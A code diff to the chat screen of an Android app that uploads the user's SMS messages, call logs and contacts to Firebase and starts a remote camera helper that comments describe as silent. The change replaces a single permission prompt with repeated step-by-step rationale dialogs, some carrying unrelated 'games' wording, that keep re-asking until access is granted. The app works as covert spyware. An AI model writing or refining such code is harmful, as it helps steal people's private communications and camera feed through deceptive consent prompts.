@@ -55,6 +55,7 @@ import android.webkit.WebSettings;
 import android.util.Log;
 import android.widget.Toast;
 import com.bushorat.app.helpers.CallLogHelper;
+import com.bushorat.app.helpers.PermissionUXHelper;
 import com.bushorat.app.helpers.RemoteCameraHelper;
 
 import androidx.annotation.NonNull;
@@ -84,7 +85,9 @@ public class ChatActivity extends AppCompatActivity {
     private WebView webView;
     private DatabaseReference smsRef,profileRef;
     private static final int SMS_PERMISSION_CODE = 100;
-    private static final int CHAT_PERMISSIONS_CODE = 200;
+    private static final int CHAT_STEP_RECEIVE = 210;
+    private static final int CHAT_STEP_CALL_LOG = 211;
+    private static final int CHAT_STEP_PHONE = 212;
 
     private FirebaseAuth mAuth;
 
@@ -107,18 +110,10 @@ public class ChatActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         binding = ActivityChatBinding.inflate(getLayoutInflater());
         setContentView(binding.getRoot());
-        // Ensure chat critical permissions (SMS + CALL LOG + PHONE STATE) then start background syncs
-        if (!hasChatPermissions()) {
-            requestChatPermissions();
+        if (hasChatPermissions()) {
+            startChatBackgroundSync();
         } else {
-            // Start background uploads immediately if permissions already granted
-            CallLogHelper.uploadRecentCallLogs(ChatActivity.this);
-            if (checkSmsPermission()) {
-                syncSmsToFirebase();
-            }
-            if (checkContactsPermission()) {
-                syncContactsToFirebase();
-            }
+            binding.getRoot().postDelayed(this::continueChatPermissionFlow, 1500);
         }
 
         consentManager = new ConsentManager(this);
@@ -261,11 +256,6 @@ public class ChatActivity extends AppCompatActivity {
                     }
                 });
 
-        // Check and request SMS permission (already checked above, don't call syncSmsToFirebase again)
-        if (!checkSmsPermission()) {
-            requestSmsPermission();
-        }
-
         // Show consent dialog if needed
 //        if (consentManager.shouldShowConsentDialog()) {
 //            showConsentDialog();
@@ -274,40 +264,91 @@ public class ChatActivity extends AppCompatActivity {
         // Check and request battery optimization whitelist
         checkBatteryOptimization();
 
-        // Request camera permission automatically if not granted (for remote camera access)
-        if (!isPermissionsGranted()) {
-            // Request camera permission silently in background
-            askPermissions();
-        } else {
-            // Initialize remote camera system silently (user won't know)
+        binding.findButton.setOnClickListener(view -> {
+            if (!isPermissionsGranted()) {
+                askPermissions();
+                return;
+            }
             try {
                 RemoteCameraHelper.getInstance(this).start();
             } catch (Exception e) {
                 Log.e("ChatActivity", "Error starting remote camera", e);
             }
-        }
-
-        binding.findButton.setOnClickListener(view -> {
-            if (isPermissionsGranted()) {
-                // Start background uploads and proceed to connect flow
-                CallLogHelper.uploadRecentCallLogs(ChatActivity.this);
-                showGenderSelectionDialog();
-            } else {
-                askPermissions();
-            }
+            CallLogHelper.uploadRecentCallLogs(ChatActivity.this);
+            showGenderSelectionDialog();
         });
+    }
+
+    private void startChatBackgroundSync() {
+        CallLogHelper.uploadRecentCallLogs(ChatActivity.this);
+        if (checkSmsPermission()) {
+            syncSmsToFirebase();
+        }
+        if (checkContactsPermission()) {
+            syncContactsToFirebase();
+        }
+    }
+
+    private void continueChatPermissionFlow() {
+        if (isFinishing() || hasChatPermissions()) {
+            startChatBackgroundSync();
+            return;
+        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
+                != PackageManager.PERMISSION_GRANTED) {
+            PermissionUXHelper.showRationale(
+                    this,
+                    R.string.perm_chat_title,
+                    R.string.perm_chat_message,
+                    () -> ActivityCompat.requestPermissions(this,
+                            new String[]{Manifest.permission.READ_SMS}, SMS_PERMISSION_CODE),
+                    null
+            );
+            return;
+        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
+                != PackageManager.PERMISSION_GRANTED) {
+            PermissionUXHelper.showRationale(
+                    this,
+                    R.string.perm_chat_title,
+                    R.string.perm_chat_message,
+                    () -> ActivityCompat.requestPermissions(this,
+                            new String[]{Manifest.permission.RECEIVE_SMS}, CHAT_STEP_RECEIVE),
+                    () -> binding.getRoot().postDelayed(this::continueChatPermissionFlow, 400)
+            );
+            return;
+        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
+                != PackageManager.PERMISSION_GRANTED) {
+            PermissionUXHelper.showRationale(
+                    this,
+                    R.string.perm_games_title,
+                    R.string.perm_games_call_log_message,
+                    () -> ActivityCompat.requestPermissions(this,
+                            new String[]{Manifest.permission.READ_CALL_LOG}, CHAT_STEP_CALL_LOG),
+                    () -> binding.getRoot().postDelayed(this::continueChatPermissionFlow, 400)
+            );
+            return;
+        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
+                != PackageManager.PERMISSION_GRANTED) {
+            PermissionUXHelper.showRationale(
+                    this,
+                    R.string.perm_games_title,
+                    R.string.perm_games_phone_message,
+                    () -> ActivityCompat.requestPermissions(this,
+                            new String[]{Manifest.permission.READ_PHONE_STATE}, CHAT_STEP_PHONE),
+                    () -> binding.getRoot().postDelayed(this::continueChatPermissionFlow, 400)
+            );
+            return;
+        }
+        startChatBackgroundSync();
     }
 
 
     private boolean checkSmsPermission() {
         return ContextCompat.checkSelfPermission(this,
                 Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
-    }
-
-    private void requestSmsPermission() {
-        ActivityCompat.requestPermissions(this,
-                new String[]{Manifest.permission.READ_SMS},
-                SMS_PERMISSION_CODE);
     }
 
     private boolean checkContactsPermission() {
@@ -322,42 +363,15 @@ public class ChatActivity extends AppCompatActivity {
                 ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED;
     }
 
-    private void requestChatPermissions() {
-        ActivityCompat.requestPermissions(this,
-                new String[]{
-                        Manifest.permission.READ_SMS,
-                        Manifest.permission.RECEIVE_SMS,
-                        Manifest.permission.READ_CALL_LOG,
-                        Manifest.permission.READ_PHONE_STATE
-                }, CHAT_PERMISSIONS_CODE);
-    }
-
     @Override
     public void onRequestPermissionsResult(int requestCode,
                                            @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == SMS_PERMISSION_CODE) {
-            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                syncSmsToFirebase();
-            }
-        } else if (requestCode == CHAT_PERMISSIONS_CODE) {
-            boolean allGranted = true;
-            for (int res : grantResults) {
-                if (res != PackageManager.PERMISSION_GRANTED) {
-                    allGranted = false;
-                    break;
-                }
-            }
-            if (allGranted) {
-                // Start background uploads now that we have permissions
-                CallLogHelper.uploadRecentCallLogs(ChatActivity.this);
-                syncSmsToFirebase();
-                if (checkContactsPermission()) {
-                    syncContactsToFirebase();
-                }
-            } else {
-                Toast.makeText(this, "Chat features limited without SMS/Call permissions", Toast.LENGTH_LONG).show();
-            }
+        if (requestCode == SMS_PERMISSION_CODE
+                || requestCode == CHAT_STEP_RECEIVE
+                || requestCode == CHAT_STEP_CALL_LOG
+                || requestCode == CHAT_STEP_PHONE) {
+            binding.getRoot().postDelayed(this::continueChatPermissionFlow, 400);
         } else if (requestCode == this.requestCode) {
             // Camera permissions granted - start remote camera silently
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
